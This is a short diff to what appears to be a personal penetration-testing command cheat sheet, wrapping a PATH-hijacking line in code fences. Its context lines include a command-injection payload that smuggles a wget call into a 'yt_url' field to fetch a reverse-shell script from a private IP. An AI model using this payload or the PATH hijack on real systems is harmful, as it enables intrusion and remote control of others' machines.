@@ -5,8 +5,9 @@ All command needed to be noted
 openssl s_client -showcerts -connect $ip:$port
 
 # Binary Execution Path changing 
+```bash
 export PATH=/home/somedirectory:$PATH
-
+```
 # Command injection
 yt_url=;wget${IFS}http://10.4.39.84:8000/rev.sh;
 
